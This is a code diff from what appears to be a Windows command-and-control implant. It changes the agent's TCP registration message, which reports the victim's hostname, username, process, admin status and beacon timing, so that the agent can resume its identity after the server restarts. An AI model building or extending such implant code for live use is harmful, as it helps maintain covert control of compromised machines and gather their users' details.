@@ -422,16 +422,31 @@ int transport_tcp_register(void) {
         return 0;
     }
 
-    // Registration is plaintext — AES key not yet known
+    // Registration is plaintext — AES key not yet known.
+    // Include resume_id if we already have a UUID (reconnect after server restart).
     char body[2048];
-    int body_len = snprintf(body, sizeof(body),
-        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
-        "\"pid\":%lu,\"transport\":\"tcp\","
-        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\","
-        "\"is_admin\":%s,\"parent_id\":\"%s\",\"language\":\"c\"}",
-        hostname_j, username_json, (unsigned long)GetCurrentProcessId(),
-        AGENT_SLEEP_SEC, AGENT_JITTER_PCT, process_json,
-        tcp_is_elevated() ? "true" : "false", parent_json);
+    int body_len;
+    if (g_agent.agent_id[0]) {
+        body_len = snprintf(body, sizeof(body),
+            "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
+            "\"pid\":%lu,\"transport\":\"tcp\","
+            "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\","
+            "\"is_admin\":%s,\"parent_id\":\"%s\",\"language\":\"c\","
+            "\"resume_id\":\"%s\"}",
+            hostname_j, username_json, (unsigned long)GetCurrentProcessId(),
+            AGENT_SLEEP_SEC, AGENT_JITTER_PCT, process_json,
+            tcp_is_elevated() ? "true" : "false", parent_json,
+            g_agent.agent_id);
+    } else {
+        body_len = snprintf(body, sizeof(body),
+            "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
+            "\"pid\":%lu,\"transport\":\"tcp\","
+            "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\","
+            "\"is_admin\":%s,\"parent_id\":\"%s\",\"language\":\"c\"}",
+            hostname_j, username_json, (unsigned long)GetCurrentProcessId(),
+            AGENT_SLEEP_SEC, AGENT_JITTER_PCT, process_json,
+            tcp_is_elevated() ? "true" : "false", parent_json);
+    }
     free(hostname_j);
     free(username_json);
     free(process_json);
